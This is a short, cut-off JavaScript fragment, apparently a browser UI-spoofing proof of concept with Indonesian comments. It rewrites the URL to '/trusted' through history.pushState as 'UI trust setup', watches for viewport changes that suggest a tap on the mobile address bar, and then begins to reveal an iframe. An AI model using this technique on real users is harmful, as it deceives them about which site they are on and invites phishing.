<script>
const iframe = document.getElementById('childFrame');
let triggered = false;
let lastHeight = window.innerHeight;

// history manipulation (UI trust setup)
history.pushState({}, '', '/trusted');

function omnibarLikely() {
  if (triggered) return;

  // omnibar tap biasanya bikin viewport height berubah

    // step 1: tampilkan iframe
